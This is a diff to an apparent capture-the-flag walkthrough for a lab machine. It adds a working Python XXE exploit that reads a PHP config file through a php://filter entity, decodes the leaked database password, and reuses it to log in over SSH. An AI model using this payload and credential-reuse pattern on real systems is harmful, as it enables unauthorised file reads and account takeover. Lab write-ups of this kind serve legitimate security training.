@@ -130,3 +130,94 @@ usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
 </table>
 ```
 
+#### Reading dp.php for Getting Credentials
+
+Exploit (xxe_exploit2.php)
+```python
+#!/usr/bin/python3
+
+import requests
+import base64
+
+def xxe(url, endpoint):
+
+	payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
+	<!DOCTYPE foo [ <!ENTITY bigb0ss SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">]>  
+           <bugreport>  
+           <title>no</title>  
+           <cwe>no</cwe>  
+           <cvss>no</cvss>  
+           <reward>&bigb0ss;</reward>  
+           </bugreport>"""
+
+	payload_bytes = payload.encode('ascii')
+	payload_b64enc = base64.b64encode(payload_bytes)
+	payload_b64 = payload_b64enc.decode('ascii')
+
+	#print(payload_b64)
+
+	data = {
+		"data": payload_b64,
+	}
+
+	r = requests.post(url + endpoint, data=data)
+
+	#print(r.status_code)
+	print(r.text)
+
+	return
+
+
+if __name__ == '__main__':
+	url = "http://10.10.11.100"
+	endpoint = "/tracker_diRbPr00f314.php"
+
+	xxe(url, endpoint)
+```
+
+Decoding base64 Encoded `dp.php` output:
+```console
+# echo -n "PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=" | base64 -d
+<?php
+// TODO -> Implement login system with the database.
+$dbserver = "localhost";
+$dbname = "bounty";
+$dbusername = "admin";
+$dbpassword = "m19RoAU0hP41A1sTsq6K";
+$testuser = "test";
+?>
+```
+
+### SSH Login as development
+```console
+# ssh development@10.10.11.100
+The authenticity of host '10.10.11.100 (10.10.11.100)' can't be established.
+ECDSA key fingerprint is SHA256:3IaCMSdNq0Q9iu+vTawqvIf84OO0+RYNnsDxDBZI04Y.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.100' (ECDSA) to the list of known hosts.
+development@10.10.11.100's password: 
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 29 Nov 2021 12:50:25 AM UTC
+
+  System load:  0.0               Processes:             210
+  Usage of /:   23.6% of 6.83GB   Users logged in:       0
+  Memory usage: 12%               IPv4 address for eth0: 10.10.11.100
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
+development@bountyhunter:~$ uname -a
+Linux bountyhunter 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+```
+
